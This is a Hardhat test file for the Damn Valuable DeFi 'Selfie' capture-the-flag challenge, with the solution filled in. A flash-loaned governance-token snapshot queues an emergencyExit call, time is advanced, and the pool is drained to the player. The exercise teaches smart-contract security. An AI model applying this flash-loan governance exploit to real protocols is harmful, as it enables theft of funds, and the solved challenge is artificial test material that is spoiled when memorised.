const { ethers } = require("hardhat");
const { expect } = require("chai");
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Selfie", function () {
  let deployer, player;
  let token, governance, pool;

  const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
  const TOKENS_IN_POOL = 1500000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token Snapshot
    token = await (
      await ethers.getContractFactory("DamnValuableTokenSnapshot", deployer)
    ).deploy(TOKEN_INITIAL_SUPPLY);

    // Deploy governance contract
    governance = await (
      await ethers.getContractFactory("SimpleGovernance", deployer)
    ).deploy(token.address);
    expect(await governance.getActionCounter()).to.eq(1);

    // Deploy the pool
    pool = await (
      await ethers.getContractFactory("SelfiePool", deployer)
    ).deploy(token.address, governance.address);
    expect(await pool.token()).to.eq(token.address);
    expect(await pool.governance()).to.eq(governance.address);

    // Fund the pool
    await token.transfer(pool.address, TOKENS_IN_POOL);
    await token.snapshot();
    expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
    expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
    expect(await pool.flashFee(token.address, 0)).to.eq(0);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    // 1. Deploy the attacker
    const attacker = await (
      await ethers.getContractFactory("SelfiePoolAttacker", player)
    ).deploy(token.address, pool.address, governance.address);

    // 2. Attacker borrows all pool DVT (by taking a flash loan), and in the flash loan callback
    // it takes a snapshot to pass the `_hasEnoughVotes` validation. After repaying the feeless
    // flash loan it queues an action that which contains an encoded call to
    // `SelfiePool.emergencyExit()`.
    await attacker.exploitQueueAction();

    // 3. At least 2 days must pass to pass the `_canBeExecuted()` validation when executing an
    // action. Therefore the EVM timestamp is increased to simulate this condition.
    const actionDelayInSeconds = await governance.getActionDelay();
    await ethers.provider.send("evm_increaseTime", [
      actionDelayInSeconds.toNumber(),
    ]); // 2 days
    await ethers.provider.send("evm_mine");

    // 4. Finally, the attacker executes the action, which will execute `SelfiePool.emergencyExit()`
    // on behalf `<SimpleGovernance>`, passing the `onlyGovernance` modifier check.
    await attacker.exploitExecuteAction();
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.be.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.be.equal(0);
  });
});
